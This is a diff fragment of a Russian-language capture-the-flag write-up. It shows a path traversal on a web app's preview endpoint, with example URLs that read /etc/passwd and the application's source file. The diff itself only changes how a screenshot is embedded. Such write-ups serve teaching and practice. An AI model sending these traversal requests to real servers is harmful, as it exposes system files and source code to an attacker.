@@ -7,9 +7,9 @@ http://task.duckerz.ru:21045/preview?draft=courses/python101.md
 Для проверки уязвимости я решил попытаться прочитать файл etc/passwd
 http://task.duckerz.ru:21045/preview?draft=../../../../etc/passwd
 ##### Результат:
-
+<img width="789" height="434" alt="Pasted image 20261003122517" src="https://github.com/user-attachments/assets/fba5fe12-2c5c-427d-8c13-5c03d56850ac" />
 В итоге уязвимость подтвердилась.
-![[Pasted image 20261003122517.png]]
+
 # Эксплуатация уязвимости и поиск флага
 Посмотрим код web приложения:
 http://task.duckerz.ru:21045/preview?draft=../../../../app/app.py
